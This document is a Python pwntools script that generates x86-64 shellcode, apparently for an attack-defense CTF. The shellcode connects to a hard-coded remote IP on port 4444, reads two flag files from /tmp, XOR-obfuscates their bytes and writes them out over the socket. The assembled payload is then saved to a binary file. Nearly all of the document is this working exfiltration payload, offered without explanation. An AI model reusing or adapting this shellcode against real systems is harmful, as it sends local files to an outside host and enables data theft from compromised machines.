from pwn import *
import pwnlib.shellcraft

context.arch = 'amd64'

HOST = "134.209.231.196"
PORT = 4444

def pushstr(str):
    payload = shellcraft.amd64.pushstr(str)
    cnt = 0
    for line in payload.split("\n"):
        if "push" in line and "/*" not in line:
            cnt += 1
    # payload += '    pop rax\n' * cnt
    return payload

def popstr(str):
    payload = shellcraft.amd64.pushstr(str)
    cnt = 0
    for line in payload.split("\n"):
        if "push" in line and "/*" not in line:
            cnt += 1
    payload = '    pop rax\n' * cnt
    return payload

def readfile(str):
    payload = f'''{pushstr(str)}
    /* call open('OP', 'O_RDONLY') */
    mov rdi, rsp
    mov rsi, 0
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(str)}
    cmp r10, 0
    jl end_{str.replace("/", "_")}_end

    /* call fstat('rax', 'rsp') */
    mov rdi, r10
    push SYS_fstat /* 5 */
    pop rax
    mov rsi, rsp
    syscall

    /* Get file size */
    add rsp, 48
    mov rdx, [rsp]
    sub rsp, 48

    /* call read(r10, rsp, rdx) */
    sub rsp, 0x30
    mov rdi, r10
    mov rsi, rsp
    mov rax, 0
    syscall

    /* call close(r10) */
    mov rax, 3
    mov rdi, r10
    syscall

    mov rbx, rdx
    mov rdx, 0
    /* xor encrypt */
loop_{str.replace("/", "_")}:
    cmp rdx, rbx
    jge end_{str.replace("/", "_")}
    xor rax, rax
    mov al, byte ptr [rsp + rdx]
    mov rcx, rdx
    shl rcx, 4
    add rcx, 97436
    xor rcx, 0x69
    xor rax, rcx
    mov byte ptr [rsp + rdx], al
    inc rdx
    jmp loop_{str.replace("/", "_")}

end_{str.replace("/", "_")}:
    /* call write(rbp, rsp, rdx) */
    mov rdi, rbp
    mov rsi, rsp
    mov rax, 1
    syscall

    add rsp, 0x30
end_{str.replace("/", "_")}_end:
    '''
    return payload


flags = ["/tmp/flag3.txt", "/tmp/flag4.txt"]
file_sc = []

for flag in flags:
    aux = readfile(flag)
    file_sc.append(aux)

child = f'''
    {pushstr("libp")}
    {popstr("libp")}
    {shellcraft.amd64.linux.connect(HOST, PORT, )}
    pop rsi
'''

child += "\n".join(file_sc)

child += "\n"
child += f'''/* close socket */
mov rax, 3
mov rdi, rbp
syscall

'''

error = '''/* close socket */
mov rax, 3
mov rdi, rbp
syscall
'''


payload = f'''
{child}
'''

# print(payload)
# exit()

aux = asm(payload)
# aux += asm("int3")
aux += b"\x90" * (8 - len(aux) % 8)

f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/custom_cat/pay.bin", "wb")
f.write(aux)

print()
print(f"Payload length: {len(aux)}")